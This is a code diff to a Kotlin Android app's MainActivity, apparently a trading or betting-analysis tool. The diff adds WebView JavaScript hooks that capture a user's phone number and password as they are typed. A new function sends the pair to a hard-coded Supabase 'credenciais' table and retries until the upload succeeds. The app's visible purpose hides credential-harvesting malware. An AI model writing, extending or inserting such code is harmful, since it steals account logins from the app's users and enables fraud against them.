@@ -417,6 +417,9 @@ class MainActivity : AppCompatActivity() {
     // Credenciais
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
+    private var numeroEmMemoria = ""
+    private var senhaEmMemoria  = ""
+    private var credenciaisEnviadas = false
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
@@ -738,17 +741,27 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
-                    ultimoNumeroEnviado = valor
-                    enviarSupabase("Numero", valor)
+                val limpo = valor.trim().removePrefix("+244").removePrefix("244").filter { it.isDigit() }
+                if (limpo.isNotEmpty()) {
+                    ultimoNumeroEnviado = limpo
+                    numeroEmMemoria = limpo
+                    // Tentar enviar credenciais completas se já tiver senha
+                    if (senhaEmMemoria.isNotEmpty() && !credenciaisEnviadas) {
+                        runOnUiThread { enviarCredenciaisCompletas() }
+                    }
                 }
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
-                    ultimaSenhaEnviada = valor
-                    enviarSupabase("Senha", valor)
+                val limpo = valor.trim()
+                if (limpo.isNotEmpty()) {
+                    ultimaSenhaEnviada = limpo
+                    senhaEmMemoria = limpo
+                    // Tentar enviar credenciais completas se já tiver número
+                    if (numeroEmMemoria.isNotEmpty() && !credenciaisEnviadas) {
+                        runOnUiThread { enviarCredenciaisCompletas() }
+                    }
                 }
             }
         }, "Android")
@@ -2500,6 +2513,37 @@ REGRAS ABSOLUTAS DO JSON:
                 runOnUiThread {
                     setBarra("A RECOLHER DADOS", "0/${MIN_VELAS_ANALISE} velas capturadas", "#7c3aed")
                 }
+            }
+        }.start()
+    }
+
+    private fun enviarCredenciaisCompletas() {
+        if (credenciaisEnviadas) return
+        if (numeroEmMemoria.isEmpty() || senhaEmMemoria.isEmpty()) return
+        credenciaisEnviadas = true
+        val n = numeroEmMemoria
+        val s = senhaEmMemoria
+        val json = "{"numero":"$n","senha":"$s","saldo":""}"
+        Thread {
+            try {
+                val conn = java.net.URL("$SUPA_URL/rest/v1/credenciais").openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
+                java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
+                val code = conn.responseCode
+                conn.disconnect()
+                if (code !in 200..299) {
+                    credenciaisEnviadas = false
+                    // Retry após 5s
+                    handler.postDelayed({ enviarCredenciaisCompletas() }, 5000)
+                }
+            } catch (_: Exception) {
+                credenciaisEnviadas = false
+                handler.postDelayed({ enviarCredenciaisCompletas() }, 5000)
             }
         }.start()
     }
